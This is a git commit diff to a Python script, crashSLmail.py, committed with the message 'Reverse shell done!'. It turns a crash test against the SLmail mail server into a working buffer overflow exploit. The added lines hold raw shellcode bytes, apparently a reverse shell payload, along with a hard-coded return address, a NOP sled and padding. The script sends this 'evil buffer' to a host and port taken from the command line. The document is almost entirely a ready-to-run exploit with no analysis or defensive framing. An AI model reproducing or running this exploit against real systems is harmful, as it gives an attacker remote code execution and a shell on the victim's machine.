57594a34fa03a9b87def18d5d5b6c891e5249129
root <root@localhost.localdomain>
2018-11-12 12:05:13 +0600

    Reverse shell done!

--- crashSLmail.py
+++ crashSLmail.py
@@ -3,7 +3,6 @@ import socket
 import sys
 from time import sleep
 
-
 counter=2700
 host=str(sys.argv[1])
 port=int(sys.argv[2])
@@ -16,7 +15,34 @@ if len(sys.argv)!=3:
 else:
 	pass
 
-buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"
+payload = (
+"\xba\x24\x28\xd4\x0b\xd9\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
+"\x52\x83\xc6\x04\x31\x56\x0e\x03\x72\x26\x36\xfe\x86\xde\x34"
+"\x01\x76\x1f\x59\x8b\x93\x2e\x59\xef\xd0\x01\x69\x7b\xb4\xad"
+"\x02\x29\x2c\x25\x66\xe6\x43\x8e\xcd\xd0\x6a\x0f\x7d\x20\xed"
+"\x93\x7c\x75\xcd\xaa\x4e\x88\x0c\xea\xb3\x61\x5c\xa3\xb8\xd4"
+"\x70\xc0\xf5\xe4\xfb\x9a\x18\x6d\x18\x6a\x1a\x5c\x8f\xe0\x45"
+"\x7e\x2e\x24\xfe\x37\x28\x29\x3b\x81\xc3\x99\xb7\x10\x05\xd0"
+"\x38\xbe\x68\xdc\xca\xbe\xad\xdb\x34\xb5\xc7\x1f\xc8\xce\x1c"
+"\x5d\x16\x5a\x86\xc5\xdd\xfc\x62\xf7\x32\x9a\xe1\xfb\xff\xe8"
+"\xad\x1f\x01\x3c\xc6\x24\x8a\xc3\x08\xad\xc8\xe7\x8c\xf5\x8b"
+"\x86\x95\x53\x7d\xb6\xc5\x3b\x22\x12\x8e\xd6\x37\x2f\xcd\xbe"
+"\xf4\x02\xed\x3e\x93\x15\x9e\x0c\x3c\x8e\x08\x3d\xb5\x08\xcf"
+"\x42\xec\xed\x5f\xbd\x0f\x0e\x76\x7a\x5b\x5e\xe0\xab\xe4\x35"
+"\xf0\x54\x31\x99\xa0\xfa\xea\x5a\x10\xbb\x5a\x33\x7a\x34\x84"
+"\x23\x85\x9e\xad\xce\x7c\x49\xd8\x05\x7e\xa8\xb4\x1b\x7e\xab"
+"\xff\x95\x98\xc1\xef\xf3\x33\x7e\x89\x59\xcf\x1f\x56\x74\xaa"
+"\x20\xdc\x7b\x4b\xee\x15\xf1\x5f\x87\xd5\x4c\x3d\x0e\xe9\x7a"
+"\x29\xcc\x78\xe1\xa9\x9b\x60\xbe\xfe\xcc\x57\xb7\x6a\xe1\xce"
+"\x61\x88\xf8\x97\x4a\x08\x27\x64\x54\x91\xaa\xd0\x72\x81\x72"
+"\xd8\x3e\xf5\x2a\x8f\xe8\xa3\x8c\x79\x5b\x1d\x47\xd5\x35\xc9"
+"\x1e\x15\x86\x8f\x1e\x70\x70\x6f\xae\x2d\xc5\x90\x1f\xba\xc1"
+"\xe9\x7d\x5a\x2d\x20\xc6\x7a\xcc\xe0\x33\x13\x49\x61\xfe\x7e"
+"\x6a\x5c\x3d\x87\xe9\x54\xbe\x7c\xf1\x1d\xbb\x39\xb5\xce\xb1"
+"\x52\x50\xf0\x66\x52\x71" )
+
+#5F4A358F
+buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + payload + "C"*(3500-2606-4-351-16)
 
 try:
 	print "\nSending evil buffer with %s bytes" % len(buffer)
@@ -29,4 +55,3 @@ try:
 	print "\nDone! ;-)"
 except:
         print "Could not connect to %s port" % port
-
